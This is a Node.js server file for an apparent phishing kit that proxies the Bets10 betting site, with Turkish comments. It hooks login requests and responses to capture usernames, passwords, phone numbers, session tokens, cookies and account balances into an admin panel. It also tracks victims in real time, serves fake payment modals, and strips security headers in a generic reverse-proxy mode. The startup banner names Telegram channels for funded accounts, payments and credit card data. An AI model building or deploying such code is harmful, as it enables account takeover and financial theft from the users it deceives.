/**
 * Bets10 Proxy Server - WITH ADMIN PANEL + LIVE CHAT + REALTIME TRACKING
 * - HTTP Proxy
 * - Admin Panel
 * - Telegram Integration
 * - Fake Payment Modals
 * - Live Chat (Zendesk Blocker + Custom Script)
 * - Socket.io Real-time Visitor Tracking
 */

const http = require('http');
const path = require('path');
const fs = require('fs');

// Load modules
const DebugLogger = require('./src/debug-logger');
const URLRewriter = require('./src/url-rewriter');
const JSInjector = require('./src/js-injector');
const HTTPProxy = require('./src/http-proxy');
const AdminPanel = require('./src/admin-panel');
const AdminRoutes = require('./src/admin-routes');
const RealtimeTracker = require('./src/realtime-tracker');

// Socket.io - optional, graceful fallback
let Server;
try {
  Server = require('socket.io').Server;
} catch (e) {
  console.log('[INFO] Socket.io not installed, using polling mode');
  Server = null;
}

class Bets10Proxy {
  constructor() {
    // ══════════════════════════════════════════════════════════
    // LOAD CONFIG
    // ══════════════════════════════════════════════════════════
    
    const configPath = path.join(__dirname, 'config.json');
    
    if (!fs.existsSync(configPath)) {
      console.error('❌ config.json not found!');
      process.exit(1);
    }
    
    this.config = require(configPath);
    console.log('[CONFIG] Loaded from', configPath);
    
    // Reverse proxy mode: target tanımlanmamışsa URL-tabanlı reverse proxy devreye girer
    this.reverseMode = !this.config.target;
    if (this.reverseMode) {
      console.log('[CONFIG] No target set — REVERSE PROXY mode active');
      // Modüllerin undefined patlamasını önlemek için placeholder
      this.config.target = '__reverse__';
    }
    
    // ══════════════════════════════════════════════════════════
    // INITIALIZE DEBUG LOGGER
    // ══════════════════════════════════════════════════════════
    
    this.logger = new DebugLogger(this.config);
    this.logger.log('info', 'INIT', 'Starting Bets10 Proxy...');
    
    // ══════════════════════════════════════════════════════════
    // INITIALIZE REALTIME TRACKER
    // ══════════════════════════════════════════════════════════
    
    this.realtimeTracker = new RealtimeTracker();
    
    // ══════════════════════════════════════════════════════════
    // INITIALIZE ADMIN PANEL FIRST (for JSInjector)
    // ══════════════════════════════════════════════════════════
    
    this.adminPanel = new AdminPanel(this.config, this.logger);
    this.adminRoutes = new AdminRoutes(this.adminPanel, this.config, this.realtimeTracker);
    
    // ══════════════════════════════════════════════════════════
    // INITIALIZE COMPONENTS (WITH SUPPORT DOMAIN + ADMIN PANEL)
    // ══════════════════════════════════════════════════════════
    
    this.urlRewriter = new URLRewriter(
      this.config.myDomain,
      this.config.target,
      this.logger,
      this.config.supportDomain
    );
    
    // JSInjector'a adminPanel'i geçir (Live Chat için)
    this.jsInjector = new JSInjector(
      this.config.myDomain,
      this.config.target,
      this.logger,
      this.config,
      this.adminPanel
    );
    
    this.httpProxy = new HTTPProxy(
      this.config,
      this.urlRewriter,
      this.jsInjector,
      this.logger
    );
    
    // Connect HTTP Proxy credential capture to Admin Panel
    this.connectCredentialCapture();
    
    // ══════════════════════════════════════════════════════════
    // CREATE HTTP SERVER
    // ══════════════════════════════════════════════════════════
    
    this.server = http.createServer((req, res) => {
      this.handleRequest(req, res);
    });
    
    // ══════════════════════════════════════════════════════════
    // SOCKET.IO SETUP (if available)
    // ══════════════════════════════════════════════════════════
    
    this.io = null;
    if (Server) {
      this.io = new Server(this.server, {
        path: '/_admin/socket',
        cors: { origin: '*' }
      });
      this.setupSocketIO();
    }
  }

  // Setup Socket.io for real-time updates
  setupSocketIO() {
    if (!this.io) return;
    
    this.io.on('connection', (socket) => {
      console.log('[SOCKET] Admin connected:', socket.id);
      
      // İlk bağlantıda mevcut verileri gönder
      socket.emit('visitors', this.realtimeTracker.getStats());
      
      // Disconnect
      socket.on('disconnect', () => {
        console.log('[SOCKET] Admin disconnected:', socket.id);
      });
    });
    
    // Her 2 saniyede bir tüm admin'lere güncelleme gönder
    setInterval(() => {
      if (this.io.engine.clientsCount > 0) {
        this.io.emit('visitors', this.realtimeTracker.getStats());
      }
    }, 2000);
  }

  // Connect HTTP Proxy credential capture to Admin Panel
  connectCredentialCapture() {
    const originalCapture = this.httpProxy.captureFromBody.bind(this.httpProxy);
    const originalCaptureResponse = this.httpProxy.captureAuthResponse.bind(this.httpProxy);
    const adminPanel = this.adminPanel;
    const realtimeTracker = this.realtimeTracker;
    
    // Override captureFromBody - Login attempt'i kaydet
    this.httpProxy.captureFromBody = function(body, req) {
      originalCapture(body, req);
      
      try {
        const data = JSON.parse(body.toString());
        if (data.password && (data.username || data.email)) {
          const username = data.username || data.email;
          const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
          
          adminPanel.captureCredential({
            username: username,
            password: data.password,
            phone: data.phone,
            ip: ip,
            userAgent: req.headers['user-agent']
          });
          
          // Login attempt'i geçici olarak kaydet (response gelince onaylanacak)
          console.log('[CAPTURE] Login attempt:', username, 'IP:', ip);
        }
      } catch (e) {}
    };
    
    // Override captureAuthResponse - Token, Cookie, UserAgent dahil
    this.httpProxy.captureAuthResponse = function(content, path, req) {
      originalCaptureResponse(content, path, req);
      
      try {
        const data = JSON.parse(content.toString());
        if (data.authenticationToken || data.token || data.accessToken || data.balance !== undefined) {
          const creds = adminPanel.credentials;
          const ip = req?.headers?.['x-forwarded-for'] || req?.socket?.remoteAddress || '';
          
          // Response'dan username al (bazı API'ler döndürür)
          let username = data.username || data.email || data.login || data.user?.username || data.user?.email;
          
          // Yoksa son credential'dan al
          if (!username && creds.length > 0) {
            const lastCred = creds[creds.length - 1];
            // Son 30 saniye içinde kaydedilmiş olmalı
            const credTime = new Date(lastCred.capturedAt).getTime();
            if (Date.now() - credTime < 30000) {
              username = lastCred.username;
            }
          }
          
          if (username) {
            adminPanel.updateCredentialWithLogin(username, {
              authenticationToken: data.authenticationToken,
              token: data.token || data.accessToken,
              customerId: data.customerId,
              transactionId: data.transactionId,
              balance: data.balance,
              sessionId: data.sessionId,
              cookies: req?.headers?.cookie || '',
              userAgent: req?.headers?.['user-agent'] || '',
              ip: ip
            });
            
            // Realtime tracker'a giriş bilgisini kaydet
            if (realtimeTracker) {
              realtimeTracker.setLoggedInUser(ip, username, data.balance);
              console.log('[REALTIME] Login tracked:', username, 'IP:', ip);
            }
          }
        }
      } catch (e) {
        console.log('[CAPTURE] Auth response parse error:', e.message);
      }
    };
  }

  async handleRequest(req, res) {
    const url = req.url || '/';
    const ip = req.headers['x-forwarded-for'] || req.socket?.remoteAddress || '';
    const userAgent = req.headers['user-agent'] || '';
    
    // ══════════════════════════════════════════════════════════
    // REALTIME VISITOR TRACKING
    // ══════════════════════════════════════════════════════════
    
    const urlPath = url.split('?')[0];
    
    // Track edilecek sayfalar
    const shouldTrack = (
      urlPath === '/' ||
      urlPath === '/tr' ||
      urlPath === '/tr/' ||
      /^\/tr\/[a-z0-9-]+\/?$/i.test(urlPath) ||
      /^\/_p\/hc\.support/i.test(urlPath) ||
      /^\/_p\/bonus\.[^\/]+\/?$/i.test(urlPath)
    );
    
    const isAsset = /\.(json|js|css|png|jpg|jpeg|gif|svg|ico|woff|woff2|webp)$/i.test(urlPath);
    
    if (shouldTrack && !isAsset) {
      // Realtime tracker'a kaydet
      this.realtimeTracker.trackPageView(
        ip,
        userAgent,
        urlPath,
        req.headers['referer'] || ''
      );
      
      // Eski admin panel tracker'a da kaydet (istatistikler için)
      try {
        this.adminPanel.trackVisitor({
          ip: ip,
          userAgent: userAgent,
          path: urlPath,
          referer: req.headers['referer'] || '',
          host: req.headers['host'] || ''
        });
      } catch (e) {}
    }
    
    // ══════════════════════════════════════════════════════════
    // REALTIME API ENDPOINT
    // ══════════════════════════════════════════════════════════
    
    if (url === '/_admin/api/realtime') {
      res.writeHead(200, { 
        'Content-Type': 'application/json',
        'Cache-Control': 'no-cache'
      });
      res.end(JSON.stringify(this.realtimeTracker.getStats()));
      return;
    }
    
    // ══════════════════════════════════════════════════════════
    // STATIC FILE: PAYMENT MODAL HTML
    // ══════════════════════════════════════════════════════════
    
    if (url === '/payment-modal.html') {
      return this.servePaymentModal(res);
    }
    
    // ══════════════════════════════════════════════════════════
    // ADMIN PANEL ROUTES
    // ══════════════════════════════════════════════════════════
    
    if (url.startsWith('/_admin')) {
      // Socket.io path'ini atla
      if (url.startsWith('/_admin/socket')) {
        return; // Socket.io handler'ına bırak
      }
      
      // Read body for POST requests
      let body = null;
      if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(req.method)) {
        const chunks = [];
        for await (const chunk of req) chunks.push(chunk);
        body = Buffer.concat(chunks);
      }
      
      return this.adminRoutes.handleRequest(req, res, url, body);
    }
    
    // ══════════════════════════════════════════════════════════
    // LEGACY DEBUG ROUTES (backward compatibility)
    // ══════════════════════════════════════════════════════════
    
    if (url === '/_debug' || url === '/_debug/') {
      res.writeHead(302, { 'Location': '/_admin' });
      return res.end();
    }
    
    if (url === '/_internal/all-stats') {
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({
        logger: this.logger.getStats(),
        rewriter: this.urlRewriter.getStats(),
        credentials: this.httpProxy.getCredentials(),
        admin: this.adminPanel.getStats(),
        realtime: this.realtimeTracker.getStats()
      }, null, 2));
      return;
    }
    
    if (url === '/_internal/report') {
      this.logger.generateReport();
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify(this.logger.getStats(), null, 2));
      return;
    }

    if (url === '/_internal/reset') {
      this.logger.reset();
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: true, message: 'Stats reset' }));
      return;
    }

    if (url.startsWith('/_internal/add-subdomain/')) {
      const subdomain = url.split('/')[3];
      if (subdomain) {
        this.urlRewriter.addSubdomain(subdomain);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: true, subdomain }));
      } else {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Missing subdomain' }));
      }
      return;
    }

    // ══════════════════════════════════════════════════════════
    // REVERSE PROXY MODE (target yoksa URL'den hedef al)
    // ══════════════════════════════════════════════════════════

    if (this.reverseMode) {
      return this.handleReverseProxy(req, res);
    }

    // ══════════════════════════════════════════════════════════
    // PROXY REQUEST
    // ══════════════════════════════════════════════════════════
    
    await this.httpProxy.handleRequest(req, res);
  }

  async handleReverseProxy(req, res) {
    const rawUrl = req.url || '/';
    const myHost = req.headers['host'] || 'localhost';
    const myOrigin = 'http://' + myHost;

    // URL formatı: /https://hedef.com/yol  veya  /http://hedef.com/yol
    const match = rawUrl.match(/^\/?(https?:\/\/.+)/);

    if (!match) {
      // Hedef URL yok — landing sayfası göster
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'Cache-Control': 'no-cache' });
      res.end(`<!DOCTYPE html>
<html lang="tr">
<head><meta charset="utf-8"><title>Reverse Proxy</title>
<style>body{font-family:sans-serif;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;margin:0;background:#111;color:#eee}
h2{margin-bottom:24px}form{display:flex;gap:8px}input{width:420px;padding:10px;font-size:15px;border-radius:4px;border:1px solid #444;background:#222;color:#eee}button{padding:10px 22px;font-size:15px;border-radius:4px;border:none;background:#2563eb;color:#fff;cursor:pointer}
p{margin-top:16px;color:#888;font-size:13px}</style></head>
<body>
<h2>Reverse Proxy</h2>
<form onsubmit="var v=document.getElementById('u').value.trim();if(!v.startsWith('http'))v='https://'+v;location.href='/'+v;return false">
<input id="u" type="text" placeholder="https://hedef-site.com" autofocus>
<button type="submit">Git</button>
</form>
<p>Kullanım: <code>${myOrigin}/https://hedef-site.com/sayfa</code></p>
</body></html>`);
      return;
    }

    let targetUrl = match[1];
    let parsed;
    try {
      parsed = new URL(targetUrl);
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'text/plain' });
      res.end('Geçersiz URL: ' + targetUrl);
      return;
    }

    const isHttps = parsed.protocol === 'https:';
    const lib = isHttps ? require('https') : require('http');
    const targetOrigin = parsed.origin; // https://hedef.com

    // Request body oku
    const bodyChunks = [];
    for await (const chunk of req) bodyChunks.push(chunk);
    const body = bodyChunks.length ? Buffer.concat(bodyChunks) : null;

    // Header temizle ve hedef host'u ayarla
    const fwdHeaders = Object.assign({}, req.headers);
    fwdHeaders['host'] = parsed.host;
    delete fwdHeaders['x-forwarded-for'];
    delete fwdHeaders['x-real-ip'];
    delete fwdHeaders['cf-connecting-ip'];
    if (body) fwdHeaders['content-length'] = body.length.toString();

    const options = {
      hostname: parsed.hostname,
      port: parsed.port || (isHttps ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method: req.method,
      headers: fwdHeaders,
      rejectUnauthorized: false,
      timeout: 30000
    };

    const proxyReq = lib.request(options, (proxyRes) => {
      const contentType = proxyRes.headers['content-type'] || '';
      const resHeaders = Object.assign({}, proxyRes.headers);

      // Location redirect'lerini yeniden yaz
      if (resHeaders['location']) {
        const loc = resHeaders['location'];
        if (/^https?:\/\//.test(loc)) {
          resHeaders['location'] = myOrigin + '/' + loc;
        } else {
          resHeaders['location'] = myOrigin + '/' + targetOrigin + loc;
        }
      }

      // Güvenlik başlıklarını kaldır (çerçeveleme için)
      delete resHeaders['content-security-policy'];
      delete resHeaders['x-frame-options'];
      delete resHeaders['strict-transport-security'];

      if (contentType.includes('text/html')) {
        // HTML: tüm URL referanslarını proxy üzerinden geçir
        delete resHeaders['content-encoding']; // sıkıştırma kaldır
        delete resHeaders['content-length'];
        res.writeHead(proxyRes.statusCode, resHeaders);

        const chunks = [];
        proxyRes.on('data', c => chunks.push(c));
        proxyRes.on('end', () => {
          let html = Buffer.concat(chunks).toString('utf8');

          // Mutlak URL'leri yeniden yaz (href, src, action, url(...))
          html = html.replace(
            /(href|src|action|data-src)=(["'])(https?:\/\/[^"']+)\2/g,
            (m, attr, q, url) => `${attr}=${q}${myOrigin}/${url}${q}`
          );
          // Mutlak path URL'lerini yeniden yaz
          html = html.replace(
            /(href|src|action|data-src)=(["'])(\/[^"']+)\2/g,
            (m, attr, q, p) => `${attr}=${q}${myOrigin}/${targetOrigin}${p}${q}`
          );
          // CSS url(...) içindeki mutlak URL'leri yeniden yaz
          html = html.replace(
            /url\(["']?(https?:\/\/[^)"']+)["']?\)/g,
            (m, url) => `url(${myOrigin}/${url})`
          );

          res.end(html);
        });
      } else {
        res.writeHead(proxyRes.statusCode, resHeaders);
        proxyRes.pipe(res);
      }
    });

    proxyReq.on('timeout', () => {
      proxyReq.destroy();
      if (!res.headersSent) {
        res.writeHead(504, { 'Content-Type': 'text/plain' });
        res.end('Reverse proxy timeout: ' + targetUrl);
      }
    });

    proxyReq.on('error', (err) => {
      if (!res.headersSent) {
        res.writeHead(502, { 'Content-Type': 'text/plain' });
        res.end('Reverse proxy error: ' + err.message);
      }
    });

    if (body) proxyReq.write(body);
    proxyReq.end();
  }

  servePaymentModal(res) {
    const filePath = path.join(__dirname, 'src', 'payment-modal.html');
    
    try {
      if (fs.existsSync(filePath)) {
        const content = fs.readFileSync(filePath, 'utf8');
        res.writeHead(200, { 
          'Content-Type': 'text/html; charset=utf-8',
          'Cache-Control': 'no-cache'
        });
        res.end(content);
      } else {
        console.error('[SERVER] payment-modal.html not found at:', filePath);
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Payment modal not found');
      }
    } catch (err) {
      console.error('[SERVER] Error serving payment-modal.html:', err.message);
      res.writeHead(500, { 'Content-Type': 'text/plain' });
      res.end('Internal server error');
    }
  }

  start() {
    const port = this.config.port || 3000;
    
    this.server.listen(port, () => {
      console.log('');
      console.log('═'.repeat(60));
      console.log('  🎰 BETS10 PROXY SERVER - REALTIME TRACKING');
      console.log('═'.repeat(60));
      console.log(`  Port:         ${port}`);
      console.log(`  My Domain:    ${this.config.myDomain}`);
      console.log(`  Target:       ${this.config.target}`);
      console.log(`  Support:      ${this.config.supportDomain || 'Not configured'}`);
      console.log(`  Proxy:        ${this.config.proxy?.enabled !== false && this.config.proxy ? this.config.proxy.host : 'Direct'}`);
      console.log(`  Debug:        ${this.config.debug?.enabled !== false ? 'Enabled' : 'Disabled'}`);
      console.log(`  Live Chat:    ${this.adminPanel.settings.liveChat?.enabled ? 'Enabled' : 'Disabled'}`);
      console.log(`  Socket.io:    ${this.io ? '✅ Enabled' : '⚠️ Polling mode'}`);
      console.log('');
      console.log('  🔐 Admin Panel:   http://localhost:' + port + '/_admin');
      console.log('  📡 Realtime API:  http://localhost:' + port + '/_admin/api/realtime');
      console.log('  📈 Stats API:     http://localhost:' + port + '/_internal/all-stats');
      console.log('═'.repeat(60));
      console.log('');
      console.log('  📱 TELEGRAM CHANNELS:');
      console.log('  1. Balance Channel - Bakiyeli hesaplar');
      console.log('  2. Payment Channel - Ödeme bildirimleri');
      console.log('  3. Card Channel - Kredi kartı bilgileri');
      console.log('');
      console.log('  🚀 REALTIME TRACKING:');
      console.log('  - Her ziyaretçi anlık takip edilir');
      console.log('  - Hangi sayfada olduğu görülür');
      console.log('  - Session süresi, sayfa geçmişi');
      console.log('═'.repeat(60));
      console.log('');
    });
    
    if (this.config.debug?.enabled !== false) {
      this.logger.startPeriodicReport(60000);
    }
  }

  stop() {
    this.server.close();
    this.adminPanel.saveData();
    this.realtimeTracker.destroy();
    if (this.io) this.io.close();
    console.log('[SERVER] Stopped');
  }
}

// ══════════════════════════════════════════════════════════
// RUN
// ══════════════════════════════════════════════════════════

const proxy = new Bets10Proxy();
proxy.start();

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n[SERVER] Shutting down...');
  proxy.logger.generateReport();
  proxy.adminPanel.saveData();
  proxy.stop();
  process.exit(0);
});

process.on('uncaughtException', (err) => {
  console.error('[ERROR] Uncaught:', err.message);
  console.error(err.stack);
});

process.on('unhandledRejection', (err) => {
  console.error('[ERROR] Unhandled:', err.message);
});